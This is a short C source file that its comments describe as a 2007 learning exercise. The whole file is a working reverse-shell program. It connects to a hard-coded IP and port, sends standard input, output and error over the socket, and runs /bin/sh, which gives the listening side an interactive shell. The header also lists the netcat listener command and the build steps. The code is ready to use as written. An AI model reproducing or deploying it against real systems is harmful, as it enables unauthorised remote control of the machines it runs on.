/*
 *  connect.c - A remote /bin/sh.
 *
 *  Connects to a remote host on port 1987 and gives it a nice /bin/sh prompt.
 *
 *  Carlos Reventlov <carlos@reventlov.com>.
 *  This program was written in 2007 for learning purposes.
 *
 *  On the remote side:
 *    $ nc -lvvp 1987
 *
 *  On the host side:
 *    $ gcc -o connect connect.c
 *    $ ./connect
 *
 * */

/* Random stuff this program seems to require in order to run. */
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

/* Local port. */
#define REMOTE_PORT 1987

/* Local IP address. */
#define REMOTE_IP "127.0.0.1"

/* Command we are going to execute after connection. */
#define COMMAND "/bin/sh\0"

int main() {

  // Command
  char *args[] = { COMMAND, 0 };

  // Socket and connection file descriptors.
  int sock, conn;

  // Local address for bind().
  struct sockaddr_in remote;

  // Creating an IPV4 PF_INET socket.
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  if (sock < 0) {
    perror("sock()");
    return -1;
  }

  // Preparing listenning address.
  remote.sin_family = AF_INET;
  remote.sin_port = htons(REMOTE_PORT);
  remote.sin_addr.s_addr = inet_addr(REMOTE_IP);

  if (connect(sock, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
    perror("connect()");
    return -1;
  }

  // This is the actual magic.
  //
  // Redirecting standard input, output and error into the <conn> file
  // descriptor before invoking the command so the remote player can see
  // and write to the command over the wire.
  dup2(sock, STDIN_FILENO);
  dup2(sock, STDOUT_FILENO);
  dup2(sock, STDERR_FILENO);

  // Writing a friendly hello message to the remote player.
  write(sock, "Go on!\n", 7);

  // Actually executing command. Remember everything is going to be redirected
  // to <conn>.
  execve(args[0], args, 0);

  // Prepare a clean exit.
  exit(0);
}
